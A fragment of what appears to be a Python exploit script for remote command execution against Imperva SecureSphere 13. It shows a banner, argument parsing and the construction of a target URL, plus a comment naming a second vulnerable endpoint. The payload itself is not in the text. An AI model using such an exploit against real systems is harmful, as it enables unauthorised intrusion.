...
print "+----------------------------------------------------------+"
print "|    Imperva SecureSphere 13 - Remote Command Execution    |"
print "|                                                          |"
print "+----------------------------------------------------------+"
print "\n"
...
parser.add_argument("-path", help = "path to be executed on target", type = str)
args = parser.parse_args()

# /pws/inception is another vulnerable endpoint
target_url = "https://%s%s" % (args.t,args.path)
